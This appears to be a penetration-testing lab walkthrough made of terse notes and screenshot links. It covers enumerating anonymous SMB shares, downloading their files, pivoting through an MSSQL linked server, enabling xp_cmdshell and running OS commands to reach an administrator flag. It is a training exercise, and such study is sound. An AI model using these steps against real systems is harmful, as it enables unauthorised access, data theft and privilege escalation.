#### **Enumeration**
![[Screenshot 2026-05-15 at 16.02.35.png]]

```shell
smbclient -N -L $target
```
![[Screenshot 2026-05-15 at 16.05.17.png]]
![[Screenshot 2026-05-15 at 16.12.46.png]]

### What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
![[Screenshot 2026-05-15 at 16.14.51.png]]
```shell
recurse ON
mget *
```
### Enumerate the target and find a password for the user Fiona. What is her password?
![[Screenshot 2026-05-15 at 16.19.28.png]]
![[Screenshot 2026-05-15 at 16.20.35.png]]
### Once logged in, what other user can we compromise to gain admin privileges?
![[Screenshot 2026-05-15 at 16.22.42.png]]
![[Screenshot 2026-05-15 at 16.28.32.png]]
![[Screenshot 2026-05-15 at 16.29.03.png]]
![[Screenshot 2026-05-15 at 16.29.25.png]]
```mssql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
```
### Submit the contents of the flag.txt file on the Administrator Desktop.
![[Screenshot 2026-05-15 at 16.30.20.png]]
![[Screenshot 2026-05-15 at 16.31.56.png]]
```mssql
EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];

EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
```

```mssql
EXECUTE('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
```
![[Screenshot 2026-05-15 at 16.33.55.png]]